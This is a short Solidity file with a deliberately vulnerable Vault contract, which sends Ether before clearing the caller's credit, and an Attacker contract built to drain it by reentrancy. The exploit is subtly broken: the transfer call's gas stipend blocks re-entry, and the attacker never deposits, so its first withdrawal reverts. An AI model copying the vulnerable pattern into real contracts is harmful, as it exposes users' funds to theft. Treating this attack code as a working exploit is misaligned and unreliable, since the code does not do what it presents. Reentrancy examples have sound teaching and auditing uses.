pragma solidity >=0.8.0;
contract Vault {
    mapping(address => uint256) public credit;
    function deposit() external payable { credit[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amt = credit[msg.sender];
        require(amt > 0);
        payable(msg.sender).transfer(amt);
        credit[msg.sender] = 0;
    }
}
contract Attacker {
    Vault target;
    bool hit;
    constructor(Vault _t) { target = _t; }
    function attack() external { target.withdraw(); }
    receive() external payable {
        if (!hit && address(target).balance >= msg.value) {
            hit = true;
            target.withdraw();
        }
    }
}
